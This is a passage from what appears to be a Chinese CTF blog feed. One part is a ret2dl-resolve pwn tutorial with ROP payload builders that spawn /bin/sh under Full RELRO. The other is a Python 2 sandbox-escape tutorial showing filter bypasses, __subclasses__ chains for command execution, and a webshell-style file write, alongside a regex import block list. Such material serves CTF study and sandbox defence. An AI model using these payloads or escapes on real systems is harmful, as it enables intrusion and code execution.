).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(buf + 1024 + 160, got1, 8) + # buf+1024+120        memcpy(buf, 0, 112) + # buf+1024+240        memcpy(buf + 104, buf + 2048, 8) + # buf+1024+360        write(1, buf, 112) + # buf+1024+480        memcpy(buf + 1024 + 640, got1, 8) + # buf+1024+600        read(0, 0, 112) + # buf+1024+720        p64(pop_rdi_ret) +        p64(buf + 2048 + 32) +        p64(gmon_start_plt)    ).ljust(2048, &#39;\x00&#39;) + # buf+2048    p64(buf + 2048 + 8) +    p64(5) +    p64(buf + 2048 + 24 - st_name) +    # data+24    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><h2 id="Full-RELRO"><a href="#Full-RELRO" class="headerlink" title="Full RELRO"></a>Full RELRO</h2><p>GOT1 和 GOT2 在 Full RELRO 时被置为了 0，所以重点在于如何找回 <code>link_map</code> 和 Dynamic Resolver：</p><ul><li>找回 <code>link_map</code>：<code>.dynamic</code> 中 <code>DT_BUG</code> 指向 <code>r_debug</code> 结构，<code>r_debug</code> 中 <code>r_map</code> 指向 <code>link_map</code>；</li><li>找回 Dynamic Resolver：用 <code>l_next</code> 找下一个 Library，然后用 <code>l_info[DT_PLTGOT]</code> 找出 Library 的 <code>.got.plt</code> 地址（因为大部分 Library 都不是 Full RELRO，它们对应的 GOT2 就是 <code>_dl_runtime_resolve</code>）。</li></ul><p>以 32 位的程序为例，下面是 <code>link_map</code> 和 <code>_dl_runtime_resolve</code> 的查找过程：</p><pre><code class="gdb">(gdb) p/x *(Elf32_Dyn *)(0x08049ee8+12*8)$1 = {  d_tag = 0x15,  d_un = {    d_val = 0xf7ffd928,    d_ptr = 0xf7ffd928  }}(gdb) p/x *(struct r_debug *)0xf7ffd928$2 = {  r_version = 0x1,  r_map = 0xf7ffd940,  r_brk = 0xf7febae8,  r_state = 0x0,  r_ldbase = 0xf7fdd000}(gdb) p/x *(struct link_map *)0xf7ffd940$3 = {  l_addr = 0x0,  l_name = 0xf7ffdc2c,  l_ld = 0x8049ee8,  l_next = 0xf7ffdc30,  l_prev = 0x0,  l_real = 0xf7ffd940,  l_ns = 0x0,  l_libname = 0xf7ffdc20,  l_info = {0x0, 0x8049ee8, 0x8049f58, 0x8049f50, 0x0, 0x8049f28, 0x8049f30, 0x0, 0x0, 0x0, 0x8049f38, 0x8049f40, 0x8049ef0, 0x8049ef8, 0x0, 0x0, 0x0,    0x8049f70, 0x8049f78, 0x8049f80, 0x8049f60, 0x8049f48, 0x0, 0x8049f68, 0x8049f90, 0x8049f00, 0x8049f10, 0x8049f08, 0x8049f18, 0x0, 0x0, 0x0, 0x0, 0x0,    0x8049fa0, 0x8049f98, 0x0, 0x0, 0x8049f90, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x8049fa8, 0x0 &lt;repeats 25 times&gt;, 0x8049f20},  l_phdr = 0x8048034,  l_entry = 0x8048350,  l_phnum = 0x9,  l_ldnum = 0x0,  ...(gdb) p/x ((struct link_map *)0xf7ffd940)-&gt;l_next-&gt;l_info[3]$4 = 0x0(gdb) p/x ((struct link_map *)0xf7ffd940)-&gt;l_next-&gt;l_next-&gt;l_info[3]$5 = 0xf7fd2de0(gdb) p/x *(Elf32_Dyn *)0xf7fd2de0$6 = {  d_tag = 0x3,  d_un = {    d_val = 0xf7fd3000,    d_ptr = 0xf7fd3000  }}(gdb) x/3wx 0xf7fd30000xf7fd3000:    0x0019bd88    0xf7fd7770    0xf7ff04e0(gdb) x/i 0xf7ff04e0   0xf7ff04e0 &lt;_dl_runtime_resolve&gt;:    push   eax</code></pre><p>32 位下的构造如下：</p><pre><code class="python">payload = (    ((        &#39;A&#39; * 18 + # padding        p32(buf + 1024 + 4) # set esp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(buf + 1024 + 32, r_debug_addr, 4) + # buf+1024+20        memcpy(buf, 0, 8) + # buf+1024+40 ; link_map=buf+4        memcpy(buf + 1024 + 72, link_map_addr, 4) + # buf+1024+60        memcpy(buf + 8, 0, 16) + # buf+1024+80 ; link_map-&gt;l_next=buf+20        memcpy(buf + 1024 + 112, buf + 20, 4) + # buf+1024+100        memcpy(buf + 8, 0, 16) + # buf+1024+120 ; link_map-&gt;l_next-&gt;l_next=buf+20        memcpy(buf + 1024 + 152, buf + 20, 4) + # buf+1024+140        memcpy(buf + 8, 0, 48) + # buf+1024+160 ; link_map-&gt;l_next-&gt;l_next-&gt;l_info[DT_PLTGOT]=buf+52        memcpy(buf + 1024 + 192, buf + 52, 4) + # buf+1024+180        memcpy(buf + 8, 0, 8) + # buf+1024+200 ; .got.plt=buf+12        memcpy(buf + 1024 + 232, buf + 12, 4) + # buf+1024+220        memcpy(buf + 8, 0, 12) + # buf+1024+240 ; _dl_runtime_resolve=buf+16        memcpy(buf + 1024 + 280, dl_runtime_resolve_addr, 4) + # buf+1024+260        memcpy(buf + 1024 + 284, link_map_addr, 4) + # buf+1024+280        p32(0) + # _dl_runtime_resolve        p32(0) + # link_map        p32(reloc_arg) + # reloc_arg        p32(0xdeadbeef) +        p32(buf + 2048 + 36)    ).ljust(2048, &#39;\x00&#39;) + # buf+2048        # Elf32_Rel        p32(buf) + # r_offset        p32(0x7 | (((buf + 2048 + 8 + 4 - dynsym) / 16) &lt;&lt; 8)) + # r_info        p32(0) + # padding        # Elf32_Sym &lt;= buf+2048+12        p32(buf + 2048 + 28 - dynstr) + # st_name        p32(0) + # st_value        p32(0) + # st_size        p32(0x12) + # st_info        # buf+2048+28        &#39;system\x00\x00&#39; +        &#39;/bin/sh\x00&#39;)</code></pre><p>64 位下会需要更长的输入才能完成一系列的构造：</p><pre><code class="python">payload = (    ((        &#39;A&#39; * 14 + # padding        p64(buf + 1024 - 8) + # set rbp=buf+1024-8        p64(leave_ret) # stack pivot ; set rsp=buf+1024    ).ljust(1024, &#39;\x00&#39;) +        memcpy(buf + 1024 + 160, r_debug_addr, 8) + # buf+1024+120        memcpy(buf, 0, 16) + # buf+1024+240 ; link_map_addr=buf+8        memcpy(buf + 1024 + 400, link_map_addr, 8) + # buf+1024+360        memcpy(buf + 16, 0, 32) + # buf+1024+480 ; l-&gt;l_next=buf+40        memcpy(buf + 1024 + 640, buf + 40, 8) + # buf+1024+600        memcpy(buf + 16, 0, 32) + # buf+1024+720 ; l-&gt;l_next-&gt;l_next=buf+40        memcpy(buf + 1024 + 880, buf + 40, 8) + # buf+1024+840        memcpy(buf + 16, 0, 96) + # buf+1024+960 ; l-&gt;l_next-&gt;l_next-&gt;l_info[DT_PLTGOT]=buf+104        memcpy(buf + 1024 + 1120, buf + 104, 8) + # buf+1024+1080        memcpy(buf + 16, 0, 16) + # buf+1024+1200 ; .got.plt=buf+24        memcpy(buf + 1024 + 1360, buf + 24, 8) + # buf+1024+1320        memcpy(buf + 16, 0, 24) + # buf+1024+1440 ; _dl_runtime+resolve=buf+32        memcpy(buf + 1024 + 1600, link_map_addr, 8) + # buf+1024+1560        write(1, 0, 0x1c8+8) + # buf+1024+1680        memcpy(buf + 1024 + 1840, link_map_addr, 8) + # buf+1024+1800        read(0, 0, 0x1c8+8) + # buf+1024+1920        memcpy(buf + 1024 + 2176, dl_runtime_resolve_addr, 8) + # buf+1024+2040        memcpy(buf + 1024 + 2184, link_map_addr, 8) + # buf+1024+2160        p64(pop_rdi_ret) +        p64(buf + 4096 + 40) +        p64(0) + # _dl_runtime_resolve        p64(0) + # link_map        p64(reloc_arg) # reloc_arg    ).ljust(4096, &#39;\x00&#39;) + # buf+4096        # Elf64_Rela        p64(buf) + # r_offset        p64(0x7 | (((buf + 4096 + 16 - dynsym) / 24) &lt;&lt; 32)) + # r_info        # Elf64_Sym &lt;= buf+4096+16        p32(buf + 4096 + 32 - dynstr) + # st_name        p32(0x12) + # st_info        p32(0) +        p32(0) +        # buf+4096+32        &#39;system\x00\x00&#39; +        &#39;/bin/sh\x00&#39;)</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.youtube.com/watch?v=wsIvqd9YqTI" target="_blank" rel="noopener">https://www.youtube.com/watch?v=wsIvqd9YqTI</a><br><a href="https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf" target="_blank" rel="noopener">https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-di-frederico.pdf</a><br><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=42933</a><br><a href="http://www.inforsec.org/wp/?p=389" target="_blank" rel="noopener">http://www.inforsec.org/wp/?p=389</a><br><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a><br><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" target="_blank" rel="noopener">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a><br><a href="http://phrack.org/issues/58/4.html" target="_blank" rel="noopener">http://phrack.org/issues/58/4.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初探Python沙箱逃逸</title>
    <link href="/2020/04/02/%E5%88%9D%E6%8E%A2Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <url>/2020/04/02/%E5%88%9D%E6%8E%A2Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<p>接触过的 Python 沙箱逃逸不是很多，参考了很多大佬的博客。本文主要基于 Python2。</p><a id="more"></a><blockquote><p>沙箱逃逸，就是在给我们的一个代码执行环境下，脱离种种过滤和限制，最终拿到 shell。</p></blockquote><p>对于 Python2 的沙箱逃逸而言，实现目的的最终想法有以下几个：</p><ul><li>使用 <code>os</code> 包中的 <code>popen</code>、<code>system</code> 两个函数</li><li>使用 <code>commands</code> 模块中的方法</li><li>使用 <code>subprocess</code> 模块中的方法</li><li>使用写文件到指定位置，再使用其他辅助手段</li></ul><p>总体来说，就是使用以下几个函数来执行命令：</p><pre><code class="python">import osimport subprocessimport commandsos.system(&#39;ifconfig&#39;)os.popen(&#39;ifconfig&#39;)commands.getoutput(&#39;ifconfig&#39;)commands.getstatusoutput(&#39;ifconfig&#39;)subprocess.call([&#39;ifconfig&#39;], shell=True)</code></pre><p>下面记录针对不同情况采取的绕过方法。</p><blockquote><p>PS：获取当前的 Python 环境</p><pre><code class="python">import sysprint sys.version</code></pre></blockquote><h1 id="一些有用的模块和函数"><a href="#一些有用的模块和函数" class="headerlink" title="一些有用的模块和函数"></a>一些有用的模块和函数</h1><p>除了上面提到的几个模块，还有几种可以曲线救国。</p><h2 id="timeit-模块"><a href="#timeit-模块" class="headerlink" title="timeit 模块"></a><code>timeit</code> 模块</h2><p>用于测试小代码片段的运行时间（<code>number</code> 即表示测试的次数）：</p><pre><code class="python">import timeittimeit.timeit(&quot;__import__(&#39;os&#39;).system(&#39;pwd&#39;)&quot;, number=1)</code></pre><h2 id="platform-模块"><a href="#platform-模块" class="headerlink" title="platform 模块"></a><code>platform</code> 模块</h2><p>类似 <code>os</code> 模块的 <code>popen</code>，可以执行命令：</p><pre><code class="python">import platformplatform.popen(&#39;pwd&#39;).read()</code></pre><h2 id="codecs-模块"><a href="#codecs-模块" class="headerlink" title="codecs 模块"></a><code>codecs</code> 模块</h2><p>可以用来读文件：</p><pre><code class="python">import codecscodecs.open(&#39;code.py&#39;).read()</code></pre><h2 id="exec-、eval-、execfile-、compile-函数"><a href="#exec-、eval-、execfile-、compile-函数" class="headerlink" title="exec()、eval()、execfile()、compile() 函数"></a><code>exec()</code>、<code>eval()</code>、<code>execfile()</code>、<code>compile()</code> 函数</h2><ul><li><code>exec()</code>：动态运行代码段，返回值为 <code>None</code></li><li><code>eval()</code>：计算单个表达式的值，有返回值</li><li><code>execfile()</code>：动态运行某个文件中的代码</li><li><code>compile()</code>：将一个字符串编译为字节代码</li></ul><pre><code class="python">In [1]: o = compile(&#39;a = 1 + 1&#39;, &#39;&lt;string&gt;&#39;, &#39;exec&#39;)In [2]: exec(o)In [3]: print a2</code></pre><h1 id="字符串过滤的绕过"><a href="#字符串过滤的绕过" class="headerlink" title="字符串过滤的绕过"></a>字符串过滤的绕过</h1><p>如果是某个字符串被过滤了，可以对它进行一些变换：</p><pre><code class="python">In [1]: d = {&#39;key&#39;: 1}In [2]: print d[&#39;yek&#39;[::-1]]1</code></pre><p>如果是关键字被过滤了，可以使用 <code>getattr</code>。<code>getattr</code> 接收两个参数，第一个是模块或对象，第二个是一个字符串。它会在模块或对象中搜索指定的函数或属性：</p><pre><code class="python">In [1]: import osIn [2]: getattr(os, &#39;676574637764&#39;.decode(&#39;hex&#39;))()Out[2]: &#39;/usr/lib/python2.7&#39;</code></pre><h1 id="import-花式处理"><a href="#import-花式处理" class="headerlink" title="import 花式处理"></a><code>import</code> 花式处理</h1><p><code>import</code> 关键字用来导入包，沙箱中对一些包或是函数进行了屏蔽，从 <code>import</code> 的不同方法到 <code>import</code> 的本质有多种不同的绕过方法。</p><h2 id="Basic"><a href="#Basic" class="headerlink" title="Basic"></a>Basic</h2><p>防御最基础的思路就是正则匹配代码中的内容，检测是否调用了 <code>import</code>：</p><pre><code class="python">In [1]: import re   ...: code = &#39;import os&#39;   ...: pat = re.compile(&#39;import\s+(os|commands|subprocess|sys)&#39;)   ...: if pat.search(code) != None:   ...:     raise Exception, &#39;Detected forbidden module.&#39;   ...:---------------------------------------------------------------------------Exception                                 Traceback (most recent call last)&lt;ipython-input-1-db50a328bbb7&gt; in &lt;module&gt;()      3 pat = re.compile(&#39;import\s+(os|commands|subprocess|sys)&#39;)      4 if pat.search(code) != None:----&gt; 5     raise Exception, &#39;Detected forbidden module.&#39;Exception: Detected forbidden module.</code></pre><p>绕过的方式也很简单，使用其他的方式来导入其他包名：</p><ul><li><code>import</code> 关键字</li><li><code>__import__</code> 函数</li><li><code>importlib</code> 库</li></ul><pre><code class="python">__import__(&#39;Y29tbWFuZHM=&#39;.decode(&#39;base64&#39;)).getoutput(&#39;pwd&#39;)import importlibx = importlib.import_module(&#39;pbzznaqf&#39;.decode(&#39;rot_13&#39;))print x.getoutput(&#39;pwd&#39;)</code></pre><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>在 Python2 中不用直接使用的内置函数被称为 builtin 函数，跟随 <code>__builtin__</code> 模块自动被加载。例如 <code>open()</code>、<code>int()</code>、<code>chr()</code> 这些函数相当于如下形式：</p><pre><code class="python">__builtin__.open()__builtin__.int()__builtin__.chr()</code></pre><p>防御的一种方法就是用 <code>del</code> 把这些函数删除：</p><pre><code class="python">In [1]: del __builtin__.chrIn [2]: chr(1)---------------------------------------------------------------------------NameError                                 Traceback (most recent call last)&lt;ipython-input-2-288f58b79c7d&gt; in &lt;module&gt;()----&gt; 1 chr(1)NameError: name &#39;chr&#39; is not defined</code></pre><p>绕过的方法是使用 <code>reload</code> 来重新加载 <code>__builtin__</code> 模块：</p><pre><code class="python">In [1]: reload(__builtin__)Out[1]: &lt;module &#39;__builtin__&#39; (built-in)&gt;In [2]: chr(1)Out[2]: &#39;\x01&#39;</code></pre><p>同时 <code>reload</code> 也是 <code>__builtin__</code> 下的一个函数，如果删除了它该怎么办？答案是使用 <code>imp</code> 模块，也可以对 <code>__builtin</code> 进行重新导入：</p><pre><code class="python">In [1]: import impIn [2]: imp.reload(__builtin__)Out[2]: &lt;module &#39;__builtin__&#39; (built-in)&gt;In [3]: chr(1)Out[3]: &#39;\x01&#39;</code></pre><h2 id="Advance"><a href="#Advance" class="headerlink" title="Advance"></a>Advance</h2><p>Python 中的所有包都是以 <code>.py</code> 文件的形式存在的，说明所有 <code>import</code> 进来的包一开始都预先在某个位置了。一般和系统相关的信息都在 <code>sys</code> 下，使用 <code>sys.path</code> 查看各个包的路径：</p><pre><code class="python">In [1]: import sysIn [2]: sys.pathOut[2]:[&#39;&#39;, &#39;/usr/local/bin&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python27.zip&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/plat-darwin&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/plat-mac&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/plat-mac/lib-scriptpackages&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-tk&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-old&#39;, &#39;/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/lib-dynload&#39;, &#39;~/Library/Python/2.7/lib/python/site-packages&#39;, &#39;/usr/local/lib/python2.7/site-packages&#39;, &#39;/usr/local/lib/python2.7/site-packages/oletools-0.54.2-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/msoffcrypto_tool-4.10.1-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/colorclass-2.2.0-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/easygui-0.98.1-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/olefile-0.46-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/ida_netnode-1.1-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/wasm-1.2-py2.7.egg&#39;, &#39;~/Tools/python-uncompyle6&#39;, &#39;/usr/local/lib/python2.7/site-packages/PyMySQL-0.9.3-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/pysm4-0.7-py2.7.egg&#39;, &#39;/usr/local/lib/python2.7/site-packages/gtk-2.0&#39;, &#39;/usr/local/lib/python2.7/site-packages/gtk-2.0&#39;, &#39;/usr/local/lib/python2.7/site-packages/IPython/extensions&#39;, &#39;~/.ipython&#39;]</code></pre><p><code>sys</code> 下还有一个 <code>modules</code>，返回一个字典，其中可以查看各个模块对应的系统路径。如果修改这个字典中的内容，前面使用的方法就都失效了：</p><pre><code class="python">In [1]: import sysIn [2]: sys.modules[&#39;os&#39;] = NoneIn [3]: import os---------------------------------------------------------------------------ImportError                               Traceback (most recent call last)&lt;ipython-input-9-543d7f3a58ae&gt; in &lt;module&gt;()----&gt; 1 import osImportError: No module named osIn [4]: __import__(&#39;os&#39;)---------------------------------------------------------------------------ImportError                               Traceback (most recent call last)&lt;ipython-input-10-1b9b14481c7e&gt; in &lt;module&gt;()----&gt; 1 __import__(&#39;os&#39;)ImportError: No module named osIn [5]: import importlibIn [6]: importlib.import_module(&#39;os&#39;)---------------------------------------------------------------------------ImportError                               Traceback (most recent call last)&lt;ipython-input-12-51afbccc7d3c&gt; in &lt;module&gt;()----&gt; 1 importlib.import_module(&#39;os&#39;)/usr/local/Cellar/python@2/2.7.17_1/Frameworks/Python.framework/Versions/2.7/lib/python2.7/importlib/__init__.pyc in import_module(name, package)     35             level += 1     36         name = _resolve_name(name[level:], package, level)---&gt; 37     __import__(name)     38     return sys.modules[name]ImportError: No module named os</code></pre><p>解决这种情况，就得尝试把对应的模块路径修复回来，一般默认的 <code>os</code> 模块是在 <code>/usr/bin/python2.7/os.py</code>：</p><pre><code class="python">In [1]: import sysIn [2]: sys.modules[&#39;os&#39;] = &#39;/usr/lib/python2.7/os.py&#39;In [3]: import os</code></pre><h2 id="Hell"><a href="#Hell" class="headerlink" title="Hell"></a>Hell</h2><p>如果把 <code>sys</code>、<code>os</code>、<code>reload</code> 等一系列模块都过滤掉了，使用什么方法来绕过呢？导入模块的过程其实就是把对应模块的代码执行一遍的过程，在知道模块对应路径的情况下，就可以相应地执行它：</p><pre><code class="python">In [1]: execfile(&#39;/usr/lib/python2.7/os.py&#39;)In [2]: system(&#39;pwd&#39;)/usr/lib/python2.7Out[2]: 0In [3]: getcwd()Out[3]: &#39;/usr/lib/python2.7&#39;</code></pre><p>在 <code>execfile</code> 被禁止的情况下，还可以用 <code>open</code> 读入文件，并使用 <code>exec</code> 来执行相应的代码：</p><pre><code class="python">In [1]: code = open(&#39;/usr/lib/python2.7/os.py&#39;, &#39;r&#39;).read()In [2]: exec codeIn [3]: getcwd()Out[3]: &#39;/usr/lib/python2.7&#39;</code></pre><h1 id="各类内联函数和属性的使用"><a href="#各类内联函数和属性的使用" class="headerlink" title="各类内联函数和属性的使用"></a>各类内联函数和属性的使用</h1><h2 id="dir-和-dict"><a href="#dir-和-dict" class="headerlink" title="dir 和 __dict__"></a><code>dir</code> 和 <code>__dict__</code></h2><p><code>dir</code> 和 <code>__dict__</code> 可以用来查看类或对象下的所有属性信息：</p><pre><code class="python">In [1]: class A():    ...:     def __init__(self):    ...:         self.a = &#39;a&#39;    ...:In [2]: dir(A)Out[2]: [&#39;__doc__&#39;, &#39;__init__&#39;, &#39;__module__&#39;]In [3]: A.__dict__Out[3]:{&#39;__doc__&#39;: None, &#39;__init__&#39;: &lt;function __main__.__init__&gt;, &#39;__module__&#39;: &#39;__main__&#39;}</code></pre><p>和 <code>sys.modules</code> 配合使用获得一个模块的引用：</p><pre><code class="python">In [1]: import sysIn [2]: dir(sys.modules[__name__])Out[2]:[&#39;In&#39;, &#39;Out&#39;, &#39;_&#39;, &#39;_11&#39;, &#39;_12&#39;, &#39;_13&#39;, &#39;_14&#39;, &#39;_15&#39;, &#39;_8&#39;, &#39;__&#39;, &#39;___&#39;, &#39;__builtin__&#39;, &#39;__builtins__&#39;, &#39;__doc__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;_dh&#39;, &#39;_i&#39;, &#39;_i1&#39;, &#39;_i10&#39;, &#39;_i11&#39;, &#39;_i12&#39;, &#39;_i13&#39;, &#39;_i14&#39;, &#39;_i15&#39;, &#39;_i16&#39;, &#39;_i17&#39;, &#39;_i2&#39;, &#39;_i3&#39;, &#39;_i4&#39;, &#39;_i5&#39;, &#39;_i6&#39;, &#39;_i7&#39;, &#39;_i8&#39;, &#39;_i9&#39;, &#39;_ih&#39;, &#39;_ii&#39;, &#39;_iii&#39;, &#39;_oh&#39;, &#39;_sh&#39;, &#39;d&#39;, &#39;exit&#39;, &#39;get_ipython&#39;, &#39;os&#39;, &#39;quit&#39;, &#39;s&#39;, &#39;sys&#39;]</code></pre><h2 id="func-code-的利用"><a href="#func-code-的利用" class="headerlink" title="func_code 的利用"></a><code>func_code</code> 的利用</h2><p>函数的 <code>func_code</code> 属性可以被用来查看函数的参数个数以及变量，还能看到函数对应的字节码：</p><pre><code class="python">In [1]: def f(x, y, z):    ...:     a = &#39;secret&#39;    ...:     b = 2333    ...:In [2]: f.func_code.co_argcountOut[2]: 3In [3]: f.func_code.co_constsOut[3]: (None, &#39;secret&#39;, 2333)In [4]: f.func_code.co_codeOut[4]: &#39;d\x01\x00}\x03\x00d\x02\x00}\x04\x00d\x00\x00S&#39;</code></pre><p>使用 <code>dis</code> 库可以获取函数对应汇编格式的字节码：</p><pre><code class="python">In [1]: import disIn [2]: dis.dis(f)  2           0 LOAD_CONST               1 (&#39;secret&#39;)              3 STORE_FAST               3 (a)  3           6 LOAD_CONST               2 (2333)              9 STORE_FAST               4 (b)             12 LOAD_CONST               0 (None)             15 RETURN_VALUE</code></pre><h2 id="mro-和-bases-属性"><a href="#mro-和-bases-属性" class="headerlink" title="__mro__ 和 __bases__ 属性"></a><code>__mro__</code> 和 <code>__bases__</code> 属性</h2><p>Python 允许多重继承，即一个子类有多个父类。<code>__mro__</code> 属性可以用来查看一个子类所有的父类；<code>__bases__</code> 可以获取上一层的继承关系：</p><pre><code class="python">In [1]: class A(object): passIn [2]: class B(object): passIn [3]: class C(A, B): passIn [4]: C.__bases__Out[4]: (__main__.A, __main__.B)In [5]: C.__mro__Out[5]: (__main__.C, __main__.A, __main__.B, object)In [6]: 1..__class__.__bases__Out[6]: (object,)In [7]: 1..__class__.__mro__Out[7]: (float, object)In [8]: &#39;&#39;.__class__.__bases__Out[8]: (basestring,)In [9]: &#39;&#39;.__class__.__mro__Out[9]: (str, basestring, object)</code></pre><p>比如在 <code>open</code> 等文件操作被限制的情况下可以用下面的方法读取文件内容（<code>__subclasses__</code> 即用来查看对象的所有子类；<code>Object</code> 的查询结果中第 40 个类为 <code>file</code>）：</p><pre><code class="python">&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;/usr/lib/python2.7/os.py&#39;).read()1..__class__.__bases__[0].__subclasses__()[40](&#39;/usr/lib/python2.7/os.py&#39;).read()</code></pre><p>其他的一些执行命令的方法（通过获取其他已经载入了 os 等模块的类进行调用）：</p><pre><code class="python"># 执行系统命令().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].os.system(&#39;ls&#39;)().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#39;)# 重新载入__builtin__().__class__.__bases__[0].__subclasses__()[59]()._module.__builtin__[&#39;__import__&#39;](&quot;os&quot;).system(&quot;ls&quot;)# 读文件().__class__.__bases__[0].__subclasses__()[40](r&#39;C:\1.php&#39;).read()# 写文件().__class__.__bases__[0].__subclasses__()[40](&#39;/var/www/html/bkdoor&#39;, &#39;w&#39;).write(&#39;123&#39;)# 执行任意命令().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls /var/www/html&quot;).read()&#39;)</code></pre><p>可以编写一个函数对导入了 <code>os</code> 或 <code>sys</code> 的库进行一个遍历：</p><pre><code class="python">#!/usr/bin/env pythonall_modules = [    &#39;BaseHTTPServer&#39;, &#39;imaplib&#39;, &#39;shelve&#39;, &#39;Bastion&#39;, &#39;anydbm&#39;, &#39;imghdr&#39;, &#39;shlex&#39;, &#39;CDROM&#39;, &#39;argparse&#39;, &#39;imp&#39;, &#39;shutil&#39;, &#39;CGIHTTPServer&#39;, &#39;array&#39;, &#39;importlib&#39;, &#39;signal&#39;, &#39;ast&#39;, &#39;imputil&#39;, &#39;site&#39;, &#39;ConfigParser&#39;, &#39;asynchat&#39;, &#39;inspect&#39;, &#39;sitecustomize&#39;, &#39;Cookie&#39;, &#39;asyncore&#39;, &#39;io&#39;, &#39;smtpd&#39;, &#39;DLFCN&#39;, &#39;atexit&#39;, &#39;itertools&#39;, &#39;smtplib&#39;, &#39;audiodev&#39;, &#39;json&#39;, &#39;sndhdr&#39;, &#39;DocXMLRPCServer&#39;, &#39;audioop&#39;, &#39;keyword&#39;, &#39;socket&#39;, &#39;base64&#39;, &#39;lib2to3&#39;, &#39;spwd&#39;, &#39;FixTk&#39;, &#39;bdb&#39;, &#39;linecache&#39;, &#39;sqlite3&#39;, &#39;HTMLParser&#39;, &#39;binascii&#39;, &#39;linuxaudiodev&#39;, &#39;sre&#39;, &#39;IN&#39;, &#39;binhex&#39;, &#39;locale&#39;, &#39;sre_compile&#39;, &#39;MimeWriter&#39;, &#39;bisect&#39;, &#39;logging&#39;, &#39;sre_constants&#39;, &#39;Queue&#39;, &#39;bsddb&#39;, &#39;sre_parse&#39;, &#39;bz2&#39;, &#39;macpath&#39;, &#39;ssl&#39;, &#39;cPickle&#39;, &#39;macurl2path&#39;, &#39;stat&#39;, &#39;SimpleHTTPServer&#39;, &#39;cProfile&#39;, &#39;mailbox&#39;, &#39;statvfs&#39;, &#39;SimpleXMLRPCServer&#39;, &#39;cStringIO&#39;, &#39;mailcap&#39;, &#39;string&#39;, &#39;SocketServer&#39;, &#39;calendar&#39;, &#39;markupbase&#39;, &#39;stringold&#39;, &#39;StringIO&#39;, &#39;cgi&#39;, &#39;marshal&#39;, &#39;stringprep&#39;, &#39;TYPES&#39;, &#39;cgitb&#39;, &#39;math&#39;, &#39;strop&#39;, &#39;chunk&#39;, &#39;md5&#39;, &#39;struct&#39;, &#39;Tkconstants&#39;, &#39;cmath&#39;, &#39;mhlib&#39;, &#39;subprocess&#39;, &#39;cmd&#39;, &#39;mimetools&#39;, &#39;sunau&#39;, &#39;code&#39;, &#39;mimetypes&#39;, &#39;sunaudio&#39;, &#39;UserDict&#39;, &#39;codecs&#39;, &#39;mimify&#39;, &#39;symbol&#39;, &#39;UserList&#39;, &#39;codeop&#39;, &#39;mmap&#39;, &#39;symtable&#39;, &#39;UserString&#39;, &#39;collections&#39;, &#39;modulefinder&#39;, &#39;sys&#39;, &#39;colorsys&#39;, &#39;multifile&#39;, &#39;sysconfig&#39;, &#39;commands&#39;, &#39;multiprocessing&#39;, &#39;syslog&#39;, &#39;__builtin__&#39;, &#39;compileall&#39;, &#39;mutex&#39;, &#39;tabnanny&#39;, &#39;__future__&#39;, &#39;compiler&#39;, &#39;netrc&#39;, &#39;_abcoll&#39;, &#39;contextlib&#39;, &#39;new&#39;, &#39;tarfile&#39;, &#39;_ast&#39;, &#39;cookielib&#39;, &#39;nis&#39;, &#39;telnetlib&#39;, &#39;_bisect&#39;, &#39;copy&#39;, &#39;nntplib&#39;, &#39;tempfile&#39;, &#39;_bsddb&#39;, &#39;copy_reg&#39;, &#39;ntpath&#39;, &#39;termios&#39;, &#39;_codecs&#39;, &#39;crypt&#39;, 